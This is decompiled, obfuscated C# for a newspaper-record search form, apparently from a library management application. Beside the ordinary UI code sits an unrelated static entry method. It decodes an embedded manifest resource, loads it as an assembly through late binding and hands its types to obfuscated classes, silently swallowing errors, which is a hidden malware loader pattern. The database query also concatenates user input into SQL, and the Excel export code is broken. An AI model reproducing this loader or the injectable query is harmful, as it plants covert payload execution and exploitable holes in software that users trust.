using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Hj7k5K;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sq4;
using c2QGt9;

namespace Bn86Yd;

[DesignerGenerated]
public class Ks1d0E : Form
{
	private IContainer components;

	private GroupBox _GroupBox4;

	private Label _Label2;

	private Label _Label1;

	private DateTimePicker _dtpDateTo;

	private DateTimePicker _dtpDateFrom;

	private GroupBox _GroupBox3;

	private DataGridView _DataGridView1;

	[AccessedThroughProperty("btnExportExcel")]
	private Button _btnExportExcel;

	private Button _btnReset;

	private ComboBox _cmbPaperName;

	private Button _Button1;

	private GroupBox _GroupBox1;

	private OleDbDataReader rdr;

	private DataTable dtable;

	private OleDbConnection con;

	private OleDbDataAdapter adp;

	private DataSet ds;

	private OleDbCommand cmd;

	private DataTable dt;

	private string cs;

	public virtual Button btnExportExcel
	{
		get
		{
			return _btnExportExcel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Qy9n6W;
			Button val = _btnExportExcel;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnExportExcel = value;
			val = _btnExportExcel;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public Ks1d0E()
	{
		((Form)this).add_Load((EventHandler)b4R0Fa);
		rdr = null;
		con = null;
		cmd = null;
		dt = new DataTable();
		cs = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=|DataDirectory|\\LMS_DB.accdb;Persist Security Info=False;";
		f9J2Zo();
	}

	protected override void y1QLr5(bool k5F3Wj)
	{
		try
		{
			if (k5F3Wj && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(k5F3Wj);
		}
	}

	private void f9J2Zo()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0256: Expected O, but got Unknown
		//IL_03a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0512: Unknown result type (might be due to invalid IL or missing references)
		//IL_051c: Expected O, but got Unknown
		//IL_0592: Unknown result type (might be due to invalid IL or missing references)
		//IL_059c: Expected O, but got Unknown
		//IL_060f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0619: Expected O, but got Unknown
		//IL_06dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0700: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d1: Expected O, but got Unknown
		//IL_07e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ee: Expected O, but got Unknown
		//IL_07f3: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ks1d0E));
		Fk98Tj(new GroupBox());
		y4S0Ba(new Label());
		Ct6a2R(new Label());
		Kw1p4Z(new DateTimePicker());
		Qq2i4B(new DateTimePicker());
		k4C5Nd(new GroupBox());
		Gp9t5L(new ComboBox());
		o4BHn1(new DataGridView());
		btnExportExcel = new Button();
		Td8a5K(new Button());
		x0ZWm6(new Button());
		Br71Ty(new GroupBox());
		((Control)Bk9w6L()).SuspendLayout();
		((Control)Fz27Tm()).SuspendLayout();
		((ISupportInitialize)Hb9f1M()).BeginInit();
		((Control)Gn7b4M()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Bk9w6L()).get_Controls().Add((Control)(object)Jq0i3S());
		((Control)Bk9w6L()).get_Controls().Add((Control)(object)Aj2c8N());
		((Control)Bk9w6L()).get_Controls().Add((Control)(object)j6QNk0());
		((Control)Bk9w6L()).get_Controls().Add((Control)(object)b0S3En());
		((Control)Bk9w6L()).set_Location(new Point(300, 13));
		((Control)Bk9w6L()).set_Margin(new Padding(3, 4, 3, 4));
		((Control)Bk9w6L()).set_Name("GroupBox4");
		((Control)Bk9w6L()).set_Padding(new Padding(3, 4, 3, 4));
		((Control)Bk9w6L()).set_Size(new Size(318, 88));
		((Control)Bk9w6L()).set_TabIndex(1);
		Bk9w6L().set_TabStop(false);
		Bk9w6L().set_Text("By Date");
		Jq0i3S().set_AutoSize(true);
		((Control)Jq0i3S()).set_Font(new Font("Palatino Linotype", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Jq0i3S()).set_Location(new Point(172, 17));
		((Control)Jq0i3S()).set_Name("Label2");
		((Control)Jq0i3S()).set_Size(new Size(22, 16));
		((Control)Jq0i3S()).set_TabIndex(33);
		Jq0i3S().set_Text("To");
		Aj2c8N().set_AutoSize(true);
		((Control)Aj2c8N()).set_Font(new Font("Palatino Linotype", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Aj2c8N()).set_Location(new Point(24, 19));
		((Control)Aj2c8N()).set_Name("Label1");
		((Control)Aj2c8N()).set_Size(new Size(33, 16));
		((Control)Aj2c8N()).set_TabIndex(6);
		Aj2c8N().set_Text("From");
		j6QNk0().set_CustomFormat("dd/MMM/yyyy");
		j6QNk0().set_Format((DateTimePickerFormat)8);
		((Control)j6QNk0()).set_Location(new Point(175, 37));
		((Control)j6QNk0()).set_Name("dtpDateTo");
		((Control)j6QNk0()).set_Size(new Size(123, 24));
		((Control)j6QNk0()).set_TabIndex(1);
		b0S3En().set_CustomFormat("dd/MMM/yyyy");
		b0S3En().set_Format((DateTimePickerFormat)8);
		((Control)b0S3En()).set_Location(new Point(24, 38));
		((Control)b0S3En()).set_Name("dtpDateFrom");
		((Control)b0S3En()).set_Size(new Size(131, 24));
		((Control)b0S3En()).set_TabIndex(0);
		((Control)Fz27Tm()).get_Controls().Add((Control)(object)Er63Aq());
		((Control)Fz27Tm()).set_Location(new Point(16, 12));
		((Control)Fz27Tm()).set_Margin(new Padding(3, 4, 3, 4));
		((Control)Fz27Tm()).set_Name("GroupBox3");
		((Control)Fz27Tm()).set_Padding(new Padding(3, 4, 3, 4));
		((Control)Fz27Tm()).set_Size(new Size(269, 88));
		((Control)Fz27Tm()).set_TabIndex(0);
		Fz27Tm().set_TabStop(false);
		Fz27Tm().set_Text("By Paper Name");
		Er63Aq().set_AutoCompleteMode((AutoCompleteMode)1);
		Er63Aq().set_AutoCompleteSource((AutoCompleteSource)256);
		((ListControl)Er63Aq()).set_FormattingEnabled(true);
		((Control)Er63Aq()).set_Location(new Point(18, 39));
		((Control)Er63Aq()).set_Name("cmbPaperName");
		((Control)Er63Aq()).set_Size(new Size(227, 25));
		((Control)Er63Aq()).set_TabIndex(0);
		Hb9f1M().set_BackgroundColor(SystemColors.ActiveBorder);
		Hb9f1M().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)Hb9f1M()).set_Location(new Point(16, 108));
		Hb9f1M().set_MultiSelect(false);
		((Control)Hb9f1M()).set_Name("DataGridView1");
		Hb9f1M().set_ScrollBars((ScrollBars)2);
		((Control)Hb9f1M()).set_Size(new Size(560, 547));
		((Control)Hb9f1M()).set_TabIndex(33);
		((Control)btnExportExcel).set_Font(new Font("Palatino Linotype", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnExportExcel).set_Location(new Point(213, 30));
		((Control)btnExportExcel).set_Name("btnExportExcel");
		((Control)btnExportExcel).set_Size(new Size(93, 36));
		((Control)btnExportExcel).set_TabIndex(1);
		((ButtonBase)btnExportExcel).set_Text("&Export Excel");
		((ButtonBase)btnExportExcel).set_UseVisualStyleBackColor(true);
		((Control)f5BPr4()).set_Font(new Font("Palatino Linotype", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)f5BPr4()).set_Location(new Point(114, 31));
		((Control)f5BPr4()).set_Name("btnReset");
		((Control)f5BPr4()).set_Size(new Size(93, 33));
		((Control)f5BPr4()).set_TabIndex(0);
		((ButtonBase)f5BPr4()).set_Text("&Reset");
		((ButtonBase)f5BPr4()).set_UseVisualStyleBackColor(true);
		((Control)r9X7Pz()).set_Font(new Font("Palatino Linotype", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)r9X7Pz()).set_Location(new Point(15, 31));
		((Control)r9X7Pz()).set_Name("Button1");
		((Control)r9X7Pz()).set_Size(new Size(93, 33));
		((Control)r9X7Pz()).set_TabIndex(2);
		((ButtonBase)r9X7Pz()).set_Text("&Get Data");
		((ButtonBase)r9X7Pz()).set_UseVisualStyleBackColor(true);
		((Control)Gn7b4M()).get_Controls().Add((Control)(object)r9X7Pz());
		((Control)Gn7b4M()).get_Controls().Add((Control)(object)btnExportExcel);
		((Control)Gn7b4M()).get_Controls().Add((Control)(object)f5BPr4());
		((Control)Gn7b4M()).set_Location(new Point(633, 12));
		((Control)Gn7b4M()).set_Margin(new Padding(3, 4, 3, 4));
		((Control)Gn7b4M()).set_Name("GroupBox1");
		((Control)Gn7b4M()).set_Padding(new Padding(3, 4, 3, 4));
		((Control)Gn7b4M()).set_Size(new Size(317, 88));
		((Control)Gn7b4M()).set_TabIndex(2);
		Gn7b4M().set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 17f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ButtonHighlight);
		((Form)this).set_ClientSize(new Size(973, 656));
		((Control)this).get_Controls().Add((Control)(object)Gn7b4M());
		((Control)this).get_Controls().Add((Control)(object)Hb9f1M());
		((Control)this).get_Controls().Add((Control)(object)Bk9w6L());
		((Control)this).get_Controls().Add((Control)(object)Fz27Tm());
		((Control)this).set_Font(new Font("Palatino Linotype", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(3, 4, 3, 4));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frmNewsPaperRecord");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Search News Paper Record");
		((Control)Bk9w6L()).ResumeLayout(false);
		((Control)Bk9w6L()).PerformLayout();
		((Control)Fz27Tm()).ResumeLayout(false);
		((ISupportInitialize)Hb9f1M()).EndInit();
		((Control)Gn7b4M()).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual GroupBox Bk9w6L()
	{
		return _GroupBox4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fk98Tj(GroupBox a1Y8Gf)
	{
		_GroupBox4 = a1Y8Gf;
	}

	[SpecialName]
	internal virtual Label Jq0i3S()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y4S0Ba(Label j2R7Je)
	{
		_Label2 = j2R7Je;
	}

	[SpecialName]
	internal virtual Label Aj2c8N()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ct6a2R(Label Ep0m4D)
	{
		_Label1 = Ep0m4D;
	}

	[SpecialName]
	internal virtual DateTimePicker j6QNk0()
	{
		return _dtpDateTo;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kw1p4Z(DateTimePicker Fc9s7M)
	{
		CancelEventHandler cancelEventHandler = Ks2o6W;
		DateTimePicker dtpDateTo = _dtpDateTo;
		if (dtpDateTo != null)
		{
			((Control)dtpDateTo).remove_Validating(cancelEventHandler);
		}
		_dtpDateTo = Fc9s7M;
		dtpDateTo = _dtpDateTo;
		if (dtpDateTo != null)
		{
			((Control)dtpDateTo).add_Validating(cancelEventHandler);
		}
	}

	[SpecialName]
	internal virtual DateTimePicker b0S3En()
	{
		return _dtpDateFrom;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qq2i4B(DateTimePicker p9YPf0)
	{
		_dtpDateFrom = p9YPf0;
	}

	[SpecialName]
	internal virtual GroupBox Fz27Tm()
	{
		return _GroupBox3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k4C5Nd(GroupBox d5S2Bt)
	{
		_GroupBox3 = d5S2Bt;
	}

	[SpecialName]
	internal virtual DataGridView Hb9f1M()
	{
		return _DataGridView1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o4BHn1(DataGridView Zp4g5W)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		DataGridViewCellMouseEventHandler val = new DataGridViewCellMouseEventHandler(k7L2Dz);
		DataGridViewRowPostPaintEventHandler val2 = new DataGridViewRowPostPaintEventHandler(Br5g0J);
		DataGridView dataGridView = _DataGridView1;
		if (dataGridView != null)
		{
			dataGridView.remove_RowHeaderMouseClick(val);
			dataGridView.remove_RowPostPaint(val2);
		}
		_DataGridView1 = Zp4g5W;
		dataGridView = _DataGridView1;
		if (dataGridView != null)
		{
			dataGridView.add_RowHeaderMouseClick(val);
			dataGridView.add_RowPostPaint(val2);
		}
	}

	[SpecialName]
	private virtual Button f5BPr4()
	{
		return _btnReset;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void Td8a5K(Button f6T3Dm)
	{
		EventHandler eventHandler = o5XMn2;
		Button btnReset = _btnReset;
		if (btnReset != null)
		{
			((Control)btnReset).remove_Click(eventHandler);
		}
		_btnReset = f6T3Dm;
		btnReset = _btnReset;
		if (btnReset != null)
		{
			((Control)btnReset).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ComboBox Er63Aq()
	{
		return _cmbPaperName;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gp9t5L(ComboBox r8JXz7)
	{
		_cmbPaperName = r8JXz7;
	}

	[SpecialName]
	private virtual Button r9X7Pz()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void x0ZWm6(Button Gb0j9A)
	{
		EventHandler eventHandler = Lo4z9S;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = Gb0j9A;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual GroupBox Gn7b4M()
	{
		return _GroupBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Br71Ty(GroupBox Cj6q0R)
	{
		_GroupBox1 = Cj6q0R;
	}

	private void Qy9n6W(object sender, EventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_037a: Unknown result type (might be due to invalid IL or missing references)
		if (Hb9f1M().get_RowCount() == 0)
		{
			MessageBox.Show("Sorry nothing to export into excel sheet..\r\nPlease retrieve data in datagridview", "", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		Cursor.set_Current(Cursors.get_WaitCursor());
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		checked
		{
			try
			{
				NewLateBinding.LateSet(objectValue, (Type)null, "Visible", new object[1] { true }, (string[])null, (Type[])null);
				short num = (short)(Hb9f1M().get_RowCount() - 1);
				short num2 = (short)(((BaseCollection)Hb9f1M().get_Columns()).get_Count() - 1);
				object obj = default(object);
				object obj2 = obj;
				NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Select", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Delete", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				short num3 = num2;
				for (short num4 = 0; num4 <= num3; num4 = (short)unchecked(num4 + 1))
				{
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[2]
					{
						1,
						num4 + 1
					}, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[1] { Hb9f1M().get_Columns().get_Item(unchecked((int)num4)).get_HeaderText() }, (string[])null, (Type[])null, false, true);
				}
				short num5 = (short)(num - 1);
				for (short num6 = 0; num6 <= num5; num6 = (short)unchecked(num6 + 1))
				{
					short num7 = num2;
					for (short num8 = 0; num8 <= num7; num8 = (short)unchecked(num8 + 1))
					{
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[2]
						{
							num6 + 2,
							num8 + 1
						}, (string[])null, (Type[])null, (bool[])null), (Type)null, "value", new object[1] { unchecked(Hb9f1M().get_Rows().get_Item((int)num6).get_Cells()
							.get_Item((int)num8)).get_Value() }, (string[])null, (Type[])null, false, true);
					}
				}
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj2, (Type)null, "Rows", new object[1] { "1:1" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "FontStyle", new object[1] { "Bold" }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(NewLateBinding.LateGet(obj2, (Type)null, "Rows", new object[1] { "1:1" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Size", new object[1] { 12 }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Columns", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "AutoFit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Select", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "EntireColumn", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "AutoFit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, (Type)null, "Cells", new object[2] { 1, 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Select", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				obj2 = null;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				ProjectData.ClearProjectError();
			}
			finally
			{
				Cursor.set_Current(Cursors.get_Default());
				objectValue = null;
			}
		}
	}

	public void Jz3m4R()
	{
		Er63Aq().set_Text("");
		b0S3En().set_Text(Conversions.ToString(DateAndTime.get_Today()));
		j6QNk0().set_Text(Conversions.ToString(DateAndTime.get_Today()));
		Hb9f1M().set_DataSource((object)null);
	}

	private void o5XMn2(object sender, EventArgs e)
	{
		Jz3m4R();
	}

	private void k7L2Dz(object sender, DataGridViewCellMouseEventArgs e)
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DataGridViewRow val = Hb9f1M().get_SelectedRows().get_Item(0);
			((Control)this).Hide();
			if (Operators.CompareString(val.get_Cells().get_Item(3).get_Value()
				.ToString(), "P", false) != 0)
			{
			}
			if (Operators.CompareString(val.get_Cells().get_Item(3).get_Value()
				.ToString(), "A", false) == 0)
			{
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void Br5g0J(object sender, DataGridViewRowPostPaintEventArgs e)
	{
		checked
		{
			string text = (e.get_RowIndex() + 1).ToString();
			SizeF sizeF = e.get_Graphics().MeasureString(text, ((Control)this).get_Font());
			if (Hb9f1M().get_RowHeadersWidth() < Convert.ToInt32(sizeF.Width + 20f))
			{
				Hb9f1M().set_RowHeadersWidth(Convert.ToInt32(sizeF.Width + 20f));
			}
			Brush controlText = SystemBrushes.get_ControlText();
			e.get_Graphics().DrawString(text, ((Control)this).get_Font(), controlText, (float)(e.get_RowBounds().Location.X + 15), (float)e.get_RowBounds().Location.Y + ((float)e.get_RowBounds().Height - sizeF.Height) / 2f);
		}
	}

	private void Lo4z9S(object sender, EventArgs e)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (Strings.Len(Strings.Trim(Er63Aq().get_Text())) == 0)
			{
				MessageBox.Show("Please Select Paper Name", "Input Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				((Control)Er63Aq()).Focus();
				return;
			}
			con = new OleDbConnection(cs);
			con.Open();
			cmd = new OleDbCommand("SELECT ID,PaperName as [Paper Name],N_Date as [Date],Status,Remarks from NewsPaper where N_Date between #" + b0S3En().get_Text() + "# and #" + j6QNk0().get_Text() + "# and PaperName='" + Er63Aq().get_Text() + "'  order by N_Date", con);
			OleDbDataAdapter val = new OleDbDataAdapter(cmd);
			DataSet dataSet = new DataSet();
			((DbDataAdapter)(object)val).Fill(dataSet, "NewsPaper");
			Hb9f1M().set_DataSource((object)dataSet.Tables["NewsPaper"]!.DefaultView);
			con.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	public void Lt3y0Y()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OleDbConnection val = new OleDbConnection(cs);
			val.Open();
			adp = new OleDbDataAdapter();
			adp.set_SelectCommand(new OleDbCommand("SELECT distinct RTRIM(PaperName) FROM NewsPaper", val));
			ds = new DataSet("ds");
			((DbDataAdapter)(object)adp).Fill(ds);
			dtable = ds.Tables[0];
			Er63Aq().get_Items().Clear();
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = dtable.Rows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator.Current;
					Er63Aq().get_Items().Add((object)dataRow[0].ToString());
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void b4R0Fa(object sender, EventArgs e)
	{
		Lt3y0Y();
	}

	[STAThread]
	public static void b7JQs3()
	{
		checked
		{
			try
			{
				int num = Math.Abs(15625);
				object[] array = new object[4];
				int num2;
				while (true)
				{
					num2 = num;
					if (num2 >= Math.Abs(15750))
					{
						break;
					}
					num += 160502;
					array[0] = new byte[num + 1];
				}
				if (num2 > Math.Abs(176100))
				{
					array[1] = Assembly.GetExecutingAssembly();
				}
				array[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(array[1], (Type)null, "GetManifestResourceNames", new object[0], (string[])null, (Type[])null, (bool[])null));
				object[] array3;
				object[] array2;
				bool[] array4;
				object obj = NewLateBinding.LateGet(a7N8Mb.Cy5k9M(), (Type)null, "Load", array3 = new object[1] { (array2 = Gz1t7F.Cr4(array))[0] }, (string[])null, (Type[])null, array4 = new bool[1] { true });
				if (array4[0])
				{
					array2[0] = RuntimeHelpers.GetObjectValue(array3[0]);
				}
				Zd7.Yp3(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "GetTypes", new object[1] { 34 }, (string[])null, (Type[])null, (bool[])null)));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Ks2o6W(object sender, CancelEventArgs e)
	{
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		if (DateTime.Compare(b0S3En().get_Value().Date, j6QNk0().get_Value().Date) > 0)
		{
			MessageBox.Show("Invalid Selection", "Input Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			((Control)j6QNk0()).Focus();
		}
	}
}
